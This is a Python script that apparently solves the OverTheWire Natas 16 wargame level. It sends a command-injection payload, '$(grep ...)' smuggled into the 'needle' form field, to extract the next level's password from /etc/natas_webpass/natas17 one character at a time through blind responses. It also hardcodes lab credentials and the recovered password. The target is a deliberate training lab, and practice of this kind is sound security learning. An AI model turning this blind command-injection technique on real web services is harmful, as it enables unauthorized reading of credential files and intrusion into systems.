import requests
import re

def bruteforce_password(url, username, password):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    # Filters chars to narrow the search range
    filtered = ''
    print ('Filtering characters: ', end = '', flush = True)
    for c in characters:
        data = { 'needle' : f'somethings$(grep {c} /etc/natas_webpass/natas17)'}
        response = requests.post(url, auth = (username, password), data = data)
        content = response.text
        
        if 'somethings' not in content:
            print(c, end = '', flush = True)
            filtered += c
    
    print()
    validpass = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
    for i in range(32-len(validpass)):
        for c in filtered:
            print(f'Trying password: {validpass + c}', end = '\r')
            data = { 'needle' : f'somethings$(grep ^{validpass+c} /etc/natas_webpass/natas17)'}
            response = requests.post(url, auth = (username, password), data = data)
            content = response.text

            if 'somethings' not in content:
                validpass += c
                break
    
    print('\nThe password was found!')
    return validpass

username = 'natas16'
password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'

url = f'http://{username}.natas.labs.overthewire.org?debug=true'

print(bruteforce_password(url, username, password))